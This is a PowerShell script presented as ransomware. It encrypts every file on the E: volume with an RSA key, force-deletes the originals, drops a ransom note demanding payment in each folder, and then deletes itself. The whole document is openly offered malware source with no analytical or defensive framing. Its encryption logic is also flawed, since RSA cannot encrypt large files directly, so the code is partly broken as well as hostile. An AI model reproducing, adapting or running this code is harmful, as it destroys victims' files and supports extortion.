# Windows Volume E Ransomware (Realistic Edition)
# Encrypts all files on the E: volume using RSA-2048 for strong, irreversible encryption

param (
    [string]$Volume = "E:\"
)

# Generate RSA Key Pair if not exists
$PrivateKeyPath = "$env:TEMP\\private_key.pem"
$PublicKeyPath = "$env:TEMP\\public_key.pem"
if (!(Test-Path $PrivateKeyPath -PathType Leaf) -or !(Test-Path $PublicKeyPath -PathType Leaf)) {
    Write-Host "Generating RSA key pair..."
    $Key = [System.Security.Cryptography.RSACng]::new(2048)

    # Export Private Key to PEM
    $PrivateKey = $Key.ExportRSAPrivateKey()
    $PrivateKeyPem = "-----BEGIN PRIVATE KEY-----`n"
    $PrivateKeyPem += [Convert]::ToBase64String($PrivateKey) -replace ".{64}","$&`n"
    $PrivateKeyPem += "`n-----END PRIVATE KEY-----"
    [System.IO.File]::WriteAllText($PrivateKeyPath, $PrivateKeyPem)

    # Export Public Key to PEM
    $PublicKey = $Key.ExportRSAPublicKey()
    $PublicKeyPem = "-----BEGIN PUBLIC KEY-----`n"
    $PublicKeyPem += [Convert]::ToBase64String($PublicKey) -replace ".{64}","$&`n"
    $PublicKeyPem += "`n-----END PUBLIC KEY-----"
    [System.IO.File]::WriteAllText($PublicKeyPath, $PublicKeyPem)
    Write-Host "RSA key pair generated."
} else {
    Write-Host "RSA key pair already exists."
}

# Load Public Key for Encryption
$PublicKey = [System.Security.Cryptography.RSACng]::new()
$PublicKeyPem = Get-Content $PublicKeyPath -Raw
$PublicKeyPem = $PublicKeyPem -replace "-----BEGIN PUBLIC KEY-----`n", ""
$PublicKeyPem = $PublicKeyPem -replace "`n-----END PUBLIC KEY-----", ""
$PublicKeyBytes = [Convert]::FromBase64String($PublicKeyPem)
$PublicKey.ImportRSAPublicKey($PublicKeyBytes, [ref]0)

function Encrypt-File {
    param (
        [string]$FilePath
    )
    try {
        # Read file bytes
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)

        # Encrypt data with RSA public key
        $EncryptedBytes = $PublicKey.Encrypt($FileBytes, $true)

        # Write encrypted file
        [System.IO.File]::WriteAllBytes($FilePath + ".enc", $EncryptedBytes)
        Remove-Item $FilePath -Force
        Write-Host "Encrypted: $FilePath"
    } catch {
        Write-Host "Failed to encrypt: $FilePath ($_)."
    }
}

# Encrypt All Files
Get-ChildItem -Path $Volume -Recurse -File | ForEach-Object {
    Encrypt-File $_.FullName
}

Write-Host "Volume E: Encryption Complete!"

# Drop Ransom Note
$RansomNote = @"
YOUR FILES HAVE BEEN ENCRYPTED!

To recover your files, you must pay the ransom.
Contact us at hacker@darkmail.com with your unique ID: $(New-Guid)
"@
Get-ChildItem -Path $Volume -Recurse -Directory | ForEach-Object {
    $NotePath = Join-Path $_.FullName "README.txt"
    Set-Content -Path $NotePath -Value $RansomNote
    Write-Host "Ransom note dropped in: $NotePath"
}

# Self-Destruct
Remove-Item $PSCommandPath -Force
Write-Host "Ransomware script has self-destructed."
